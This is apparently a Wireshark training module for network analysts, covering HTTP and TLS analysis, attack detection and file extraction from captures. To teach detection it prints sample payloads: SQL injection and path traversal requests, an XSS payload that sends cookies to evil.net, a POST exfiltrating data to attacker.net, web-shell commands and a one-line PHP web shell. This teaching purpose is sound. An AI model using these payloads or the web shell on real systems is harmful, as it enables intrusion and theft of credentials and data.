HTTP in Wireshark

HTTP is the most transparent application-layer protocol on the wire. Every request and response travels in cleartext, giving you complete visibility into headers, bodies, cookies, and credentials. This tab covers how Wireshark decodes HTTP, how to navigate request/response pairs, and how to reconstruct conversations using Follow Stream.

Learning Objectives

  • Read HTTP request and response structure in the Packet Details tree
  • Identify GET, POST, PUT, DELETE semantics and when each appears in traffic
  • Interpret common status codes (2xx, 3xx, 4xx, 5xx) from packet captures
  • Extract headers, cookies, and body content from HTTP packets
  • Use Follow HTTP Stream to reconstruct a full web conversation

Request / Response Structure

Wireshark's HTTP dissector breaks each message into a hierarchical tree. A request always appears on the packet travelling from client to server (destination port 80 or a custom port); a response travels the opposite direction. The frame carrying the response is a separate packet but Wireshark links them with the HTTP response in frame N field.

Key Field

The HTTP response in frame: N field inside a request packet is a clickable link. Click it in the Packet Details pane to jump directly to the matching response. The inverse field, HTTP request in frame: N, appears in response packets.

HTTP Methods

Each method has distinct semantics that matter during traffic analysis. The method appears in the first line of the request (the request line) and in the Info column of the Packet List.

Method Wireshark Filter Body Present Security Relevance
GET http.request.method == "GET" No Parameters in URL — search for http.request.uri for injected payloads
POST http.request.method == "POST" Yes Body may contain credentials, form data, or exfiltrated content in cleartext
PUT http.request.method == "PUT" Yes Web shell uploads; rarely legitimate on public-facing servers
DELETE http.request.method == "DELETE" Optional Destructive operations — track against access control expectations
OPTIONS http.request.method == "OPTIONS" No Pre-flight probing; reconnaissance of allowed methods on a target
HEAD http.request.method == "HEAD" No Lightweight banner grabbing — server/version header without full body transfer

Status Codes in the Packet List

Response status codes appear in the Info column and in http.response.code. Knowing the operational meaning of each class prevents misreading normal application behavior as anomalous — and vice versa.

CodeMeaningAnalyst Note
200 OKRequest succeeded, body followsMost common. Confirm Content-Type matches expected resource.
301/302Redirect (permanent/temporary)Location header reveals next URL — phishing pivots often redirect through legitimate domains.
304Not Modified (cache hit)No body. Browser served from cache. Content not on wire.
400Bad RequestMalformed syntax — often scanner noise or truncated exploit attempt.
401UnauthorizedServer requires authentication. Followed by credentials in next request.
403ForbiddenPath exists but access denied — reveals valid paths during enumeration.
404Not FoundHigh volume of 404s = directory brute-force in progress.
500Internal Server ErrorApplication crash — possible successful injection if triggered by crafted input.
503Service UnavailableOverload or DoS effect visible in timing.
Analyst Tip

Filter for all non-200 HTTP responses with http.response.code != 200 to rapidly surface anomalies, redirects, and server errors in a capture without reading every row.

Headers and Cookies

Every HTTP header is individually parsed by the Wireshark dissector and accessible as a filter field. This enables precise filtering without writing string-match expressions.

http.cookie
Matches any packet containing a Cookie: request header — reveals active session tokens
http.set_cookie
Matches Set-Cookie: response headers — shows when a server issues a new session
http.user_agent contains "curl"
Find automated curl-based requests — common in scripted exfiltration and C2 beacons
http.authorization
Catches HTTP Basic Auth credentials transmitted in the Authorization: header (base64-encoded)
HTTP Basic Auth

HTTP Basic Auth encodes credentials as base64(username:password) in the Authorization header. It is not encrypted — decode with echo "dXNlcjpwYXNz" | base64 -d. In Wireshark, the decoded value appears directly in the Credentials field of the Authorization header subtree.

Following HTTP Streams

A single web page load generates dozens of individual HTTP packets across multiple TCP segments. Follow Stream reconstructs the full application-layer conversation from all those fragments into one readable view.

Apply an HTTP display filter

Enter http in the display filter bar and press Enter. This narrows the Packet List to only HTTP requests and responses.

Select the request packet

Click the row containing the GET or POST you want to investigate. Look for the Info column to confirm the method and URI.

Open Follow HTTP Stream

Right-click the selected packet → Follow → HTTP Stream. Alternatively use the menu: Analyze → Follow → HTTP Stream.

Read the reconstructed conversation

Client data appears in red (or the first color in your profile). Server data appears in blue. The stream shows raw headers and body in order. Use the Save As button to write the response body to disk.

The reconstructed stream for the login sequence above looks like:

POST /login.php HTTP/1.1\r\n Host: example.com\r\n Content-Type: application/x-www-form-urlencoded\r\n Content-Length: 37\r\n Cookie: _ga=GA1.2.1234\r\n \r\n username=admin&password=S3cr3t!2024
HTTP/1.1 302 Found\r\n Location: /dashboard.php\r\n Set-Cookie: session=8fb3a9d1c4e2; HttpOnly; Path=/\r\n Content-Length: 0\r\n \r\n
Credential Exposure

The POST body above shows username=admin&password=S3cr3t!2024 in cleartext. This is a real scenario on any network carrying unencrypted HTTP login forms. Any host on the same broadcast domain — or any passive tap on the path — can read these credentials without any active attack.

Key Takeaways — HTTP

  • HTTP request/response pairs are linked by the HTTP response in frame / HTTP request in frame fields in the dissector tree.
  • Every header (Host, User-Agent, Cookie, Authorization) is individually filterable with http.header_name syntax.
  • POST bodies containing credentials are visible in the Packet Details tree under HTML Form URL Encoded.
  • Follow HTTP Stream collapses multi-packet exchanges into one readable view and allows saving the response body to disk.
  • High rates of 404 responses indicate directory enumeration; 500 responses triggered by crafted input indicate injection.

HTTPS / TLS Analysis

HTTPS wraps HTTP inside TLS, making the application payload opaque. However, the TLS handshake itself is negotiated in plaintext and contains a wealth of metadata: the server hostname (SNI), offered cipher suites, certificate chain, TLS version, and negotiated algorithms. This metadata is often sufficient to fingerprint clients and servers without decrypting any payload.

Learning Objectives

  • Identify each phase of the TLS handshake in the Packet List
  • Extract the SNI field from a Client Hello to determine the target hostname
  • Read certificate details (subject, issuer, validity) from the Server Certificate packet
  • Distinguish TLS 1.2 from TLS 1.3 handshake patterns in Wireshark
  • Apply JA3/JA3S fingerprinting concepts to TLS traffic classification

TLS Handshake in Wireshark

The TLS handshake precedes any application data. Every message in the handshake is a separate TCP segment that Wireshark shows as a distinct row with the protocol field set to TLSv1.2 or TLSv1.3. The Info column identifies the specific handshake message type.

Server Name Indication (SNI)

SNI is an extension inside the Client Hello that tells the server which hostname the client wants to reach. It travels in cleartext before any encryption is established. In Wireshark, it appears under Transport Layer Security → TLSv1.3 Record Layer: Handshake Protocol: Client Hello → Extension: server_name.

Isolate all Client Hello packets — entry point for SNI and JA3 analysis
tls.handshake.extensions_server_name
Show only TLS flows that include an SNI extension (most modern HTTPS traffic)
tls.handshake.type == 11
Isolate Certificate messages — expand to read the subject, issuer, and validity period

Certificate Inspection

During the TLS 1.2 handshake, the server sends a Certificate message containing the X.509 certificate chain. In TLS 1.3, the certificate is sent encrypted, but many implementations still transmit an unencrypted certificate in the first flight for compatibility. Expand Handshake Protocol: Certificate to see:

  • Certificate: rdnSequence → commonName — the domain the cert was issued for
  • Issuer → commonName — the signing CA (self-signed certs show the same value as Subject)
  • Validity → notBefore / notAfter — certificate lifetime; expired certs indicate neglected or malicious infrastructure
  • subjectAltName — additional domains covered by this certificate; wildcard entries like *.attacker.net cover all subdomains

TLS 1.2 vs TLS 1.3 in Wireshark

TLS 1.3 redesigned the handshake for both speed and privacy. The visible packet sequence is fundamentally different, which changes what metadata is available to a passive analyst.

TLS 1.2 — What You See
  • Full certificate chain in plaintext Certificate message
  • Cipher negotiation visible in Server Hello
  • Separate Client Key Exchange packet with encrypted pre-master secret
  • Change Cipher Spec sent by both sides (distinct packets)
  • Total: 4–5 round trips before application data
  • Protocol field in Wireshark: TLSv1.2
TLS 1.3 — What You See
  • Certificate is encrypted (not readable from the capture)
  • SNI still visible in Client Hello (until ECH is deployed)
  • No separate Key Exchange packet — key material is in Hello extensions
  • Encrypted Extensions packet replaces most of the Server Hello content
  • Total: 1 round trip before application data (0-RTT possible)
  • Protocol field in Wireshark: TLSv1.3
JA3 Fingerprinting

JA3 is a method for fingerprinting TLS clients using the cipher suites, extensions, elliptic curves, and curve formats advertised in the Client Hello. Wireshark does not compute JA3 natively, but you can right-click Cipher Suites in the details tree, copy as a hex string, and feed it to a JA3 calculator. Known malware families have characteristic JA3 hashes that do not change even when the C2 IP rotates.

Key Takeaways — HTTPS/TLS

  • The TLS handshake contains plaintext metadata (SNI, cipher list, certificate) even though the payload is encrypted.
  • Filter tls.handshake.type == 1 to find all Client Hellos and extract the SNI from each connection.
  • In TLS 1.2, the certificate chain is fully readable; in TLS 1.3 it is encrypted.
  • Self-signed or recently-issued certificates in HTTPS connections often indicate attacker infrastructure.
  • JA3 fingerprinting of the Client Hello can identify malware communication patterns even without decrypting traffic.

Attack Detection in HTTP Traffic

Unencrypted HTTP traffic exposes every attack payload to a network analyst. SQL injection strings, XSS code, path traversal sequences, harvested credentials, and web shell traffic all appear verbatim in packet captures. This tab walks through the Wireshark signatures for each attack category.

Learning Objectives

  • Recognize SQL injection payloads embedded in HTTP request URIs and bodies
  • Identify XSS payloads delivered via GET parameters and POST form fields
  • Detect directory traversal sequences in request paths
  • Locate cleartext credentials in POST body data
  • Distinguish web shell command execution traffic from normal HTTP
SQL Injection via URL Parameter
SQLmap / Manual

Injected SQL appears in http.request.uri as URL-encoded strings. Common sequences include single quotes (%27), comment operators (--, %23), boolean conditions (OR+1%3D1), and UNION keywords. Wireshark contains syntax allows searching for multiple indicators in one expression.

Filter: http.request.uri contains "%27" — URL-encoded single quote
Filter: http.request.uri contains "UNION" — UNION-based extraction attempt
High volume of sequential requests to the same URI with incrementing numeric parameters — automated enumeration
GET /product?id=1%27+OR+1%3D1-- HTTP/1.1 Host: shop.example.com -- Decoded: /product?id=1' OR 1=1-- -- Classic boolean-based blind injection GET /search?q=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1 -- UNION-based data extraction -- Server error (500) confirms table exists
Cross-Site Scripting (XSS) Delivery
Manual / BeEF

XSS payloads in GET requests embed script tags or event handlers in URL parameters. They are often URL-encoded but the angle brackets and script keywords remain recognizable. Reflected XSS shows the payload delivered to one victim; stored XSS shows the payload being fetched repeatedly by multiple victims from a common resource.

Filter: http.request.uri contains "%3Cscript" — URL-encoded <script>
Filter: http.request.uri contains "javascript:" — javascript: protocol handler injection
POST body containing onerror=, onload=, or alert( — event handler payloads
GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1 -- Decoded: /search?q=<script>alert(document.cookie)</script> -- Classic reflected XSS probe GET /profile?name=%22%3E%3Cimg+src=x+onerror=fetch('https://evil.net/'+%2bdocument.cookie)%3E HTTP/1.1 -- Out-of-band cookie exfiltration via onerror handler -- Victim's browser will make a GET to evil.net with the cookie value
Directory Traversal
Burp Suite / Manual

Path traversal sequences (../ and their URL-encoded variants) attempt to walk outside the web root to access system files. The target file is often /etc/passwd, win.ini, or application configuration files containing credentials. Wireshark's http.request.uri filter catches these even when the server strips the traversal from its response.

Filter: http.request.uri contains "../" — direct traversal
Filter: http.request.uri contains "%2e%2e" — double URL-encoded dot
A 200 response to a traversal URI confirms successful file read; a 403 or 404 indicates server-side blocking
GET /download?file=../../../../etc/passwd HTTP/1.1 GET /img/%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini HTTP/1.1 -- %2e%2e%2f = ../ (double URL encoding sometimes bypasses WAFs) -- Success (200) with root: content in the response body confirms vulnerability
Credential Harvesting via Cleartext POST
Passive Sniffing

Login forms submitted over HTTP send credentials in the POST body as URL-encoded key-value pairs. Wireshark parses these under HTML Form URL Encoded in the Packet Details tree — individual fields like username and password are extracted and filterable. No active attack is required; any host able to capture traffic on the path has full access.

Filter: http.request.method == "POST" && http contains "password"
In Packet Details: Hypertext Transfer Protocol → HTML Form URL Encoded → Form item: "password"
Follow HTTP Stream to see the raw username and password values without URL-decoding them manually
Web Shell Communication
China Chopper / Custom

After uploading a web shell, an attacker typically sends POST requests to the shell URL with a command in the body. Responses contain the command output in the HTTP response body. Key signatures include: POST requests to unusual file extensions (.php files in image directories, .aspx in upload paths), very small request bodies (single command parameter), and response bodies containing OS-level output (filesystem paths, process lists, user enumeration).

POST to a URI ending in .php, .aspx, or .jsp in a path that should only contain static files
Short repeated POST requests with varying body — each contains a new OS command
Response body containing /etc/, C:\Windows\, uid=, or recognizable OS output strings
China Chopper: tiny POST body containing base64-encoded PHP eval() string
POST /uploads/image123.php HTTP/1.1 Host: target.corp.com Content-Length: 31 cmd=whoami%3B+id%3B+cat+%2Fetc%2Fpasswd -- cmd=whoami; id; cat /etc/passwd -- Short POST to a file in /uploads/ is anomalous
Triage Filter

To quickly surface attack candidates across all of the above categories, use: http.request and (http.request.uri contains ".." or http.request.uri contains "%27" or http.request.uri contains "UNION" or http.request.uri contains "%3C"). This catches traversal, SQLi, and XSS in a single pass.

File Extraction from HTTP Traffic

Wireshark can reconstruct and save files transferred over HTTP directly from a packet capture. This capability is essential for extracting downloaded malware, recovering exfiltrated documents, and analyzing multipart uploads. All extraction operations are non-destructive — the original PCAP is never modified.

Learning Objectives

  • Use Export Objects → HTTP to list and save all transferred files from a capture
  • Identify indicators of malware delivery in HTTP download traffic
  • Reconstruct exfiltrated files from outbound HTTP POST traffic
  • Parse multipart/form-data boundaries to isolate individual uploaded files
  • Handle gzip-compressed responses to access the original file content

Export Objects: HTTP

The Export Objects dialog enumerates every file transferred via HTTP in the capture and lets you save any or all of them to disk. It handles HTTP/1.1 pipelining, chunked transfer encoding, and gzip decompression automatically.

Open Export Objects

Navigate to File → Export Objects → HTTP. Wireshark scans the entire capture and populates the dialog with every HTTP object it can reconstruct. This may take several seconds on large captures.

Review the object list

The dialog shows packet number, hostname, content type, size, and filename for each object. Sort by Content-Type to group executables (application/octet-stream, application/x-msdownload) separately from HTML and images. Look for suspicious filenames: double extensions (invoice.pdf.exe), randomized names (a8f3c2.exe), and mismatched types (an EXE served with image/jpeg content type).

Save and hash objects of interest

Select a file and click Save, or use Save All to export everything to a directory. After saving, compute the SHA-256 hash (sha256sum filename on Linux / macOS) and submit to VirusTotal or search in your threat intelligence platform before executing in any environment.

Correlate with the full packet stream

Double-click any object in the Export Objects dialog to jump to the corresponding packet in the main capture window. This lets you see the full request (including the User-Agent, Referer, and cookies) and the HTTP response headers alongside the file content.

Safe Handling

Files extracted from captures may be live malware. Always save to an isolated analysis directory, compute hashes before opening, and examine in a sandboxed virtual machine. Never double-click an extracted executable on your analysis workstation.

Malware Delivery Indicators

Malware downloads over HTTP have characteristic traffic patterns that appear before the file is even extracted. These indicators can be detected by filter alone without opening the file.

http.content_type contains "octet-stream"
Binary file transfers — legitimate software updates and malware downloads share this type
http.content_type contains "x-msdownload"
Windows PE executables and DLLs served directly — strong indicator of executable delivery
http.request.uri contains ".exe" or http.request.uri contains ".dll"
URI-based detection for executable extensions regardless of Content-Type header

Additional behavioral indicators beyond Content-Type:

  • The response begins with 4D 5A in the hex dump — the MZ header indicating a Windows PE file regardless of extension or content type
  • The referer header is absent or points to a suspicious domain — malware loaders rarely arrive via a legitimate browsing session
  • The download is immediately followed by DNS queries for new external hostnames — post-infection callback pattern
  • File transfer from an IP address with no matching DNS resolution — direct IP download, common in malware campaigns avoiding domain takedowns

Recovering Exfiltrated Files

Data exfiltration over HTTP typically uses POST requests with the stolen data in the body. The attacker may encode the data as base64, compress it, or break it into chunks across multiple requests. Follow HTTP Stream is the primary tool for reconstructing the full payload.

-- Exfiltration via POST to attacker-controlled domain POST /collect HTTP/1.1 Host: data-logger.attacker.net Content-Type: application/x-www-form-urlencoded Content-Length: 2847 d=H4sIAAAAAAAAA6tWKkktLlGyUlIqS40vLUpVslIqLU4tykvMTQUA... -- H4sI... is the base64 encoding of a gzip magic header (1f 8b 08) -- Decode with: echo "H4sI..." | base64 -d | gunzip -- Result: raw exfiltrated file content

Chunked Exfiltration Pattern

Sophisticated exfiltration avoids large single transfers that trigger size-based alerts. Instead, the data is split across many small POST requests, often interleaved with legitimate-looking HTTP requests to the same server. Wireshark's stream reassembly handles this transparently — Follow HTTP Stream on any single request in the sequence shows only that chunk; to reassemble all chunks you must correlate the stream index (http.file_data) across multiple packets.

Multipart Form Data Analysis

File uploads from web forms use Content-Type: multipart/form-data with a randomly-generated boundary string separating fields. Wireshark parses the MIME parts individually, making it straightforward to isolate the uploaded file from the surrounding form fields.

POST /upload HTTP/1.1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ123 Content-Length: 18432 ------WebKitFormBoundaryXYZ123 Content-Disposition: form-data; name="username" admin ------WebKitFormBoundaryXYZ123 Content-Disposition: form-data; name="file"; filename="shell.php" Content-Type: application/octet-stream <?php system($_GET['cmd']); ?> ------WebKitFormBoundaryXYZ123--
Web Shell Upload

The multipart example above is a PHP web shell uploaded through a file upload form. In Wireshark, filter for http.request.method == "POST" and look for multipart bodies where the filename ends in .php, .aspx, or .jsp. This is one of the highest-fidelity web shell upload indicators available in packet captures.

Key Takeaways — File Extraction

  • File → Export Objects → HTTP extracts all HTTP-transferred files from a capture in one operation.
  • The MZ header (4D 5A) in a response body identifies a Windows PE file regardless of Content-Type or filename extension.
  • Outbound POST bodies containing base64-encoded data followed by new DNS queries are strong exfiltration indicators.
  • Multipart POST requests with server-side script extensions in the filename field indicate web shell upload attempts.
  • Always hash extracted files before examination and analyze only in an isolated environment.

Module Summary

  • HTTP traffic is fully transparent on the wire — all methods, headers, cookies, and POST bodies are readable without any decryption.
  • TLS encrypts the HTTP payload but leaves the handshake metadata (SNI, cipher suites, certificate in TLS 1.2) visible for analysis.
  • SQL injection, XSS, traversal, and web shell payloads all leave distinct patterns in http.request.uri and POST bodies that Wireshark filters can isolate.
  • Export Objects → HTTP reconstructs transferred files without requiring manual hex reassembly.
  • Outbound POST bodies containing base64-encoded gzip data (H4sI prefix) to unfamiliar domains are a high-confidence exfiltration indicator.
